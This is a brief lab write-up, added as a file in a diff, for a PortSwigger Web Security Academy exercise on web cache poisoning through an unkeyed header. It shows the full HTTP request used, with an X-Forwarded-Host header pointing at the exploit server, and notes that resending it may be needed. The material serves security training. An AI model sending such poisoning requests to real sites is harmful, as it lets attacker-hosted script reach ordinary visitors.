@@ -1,0 +1,18 @@
+Web cache poisoning with an unkeyed header
+
+The solution provided is great and very detailed. Here's how the request should look like:
+
+GET / HTTP/1.1
+Host: ac691f6e1f6682d4800d5f9e00610089.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Forwarded-Host: acb51fb31f1082ad80355f880183002f.web-security-academy.net
+Referer: https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-with-an-unkeyed-header
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+
+In my case, I clicked on view exploit and send the request which prompted the lab complete banner. You might have to send the request a few times.
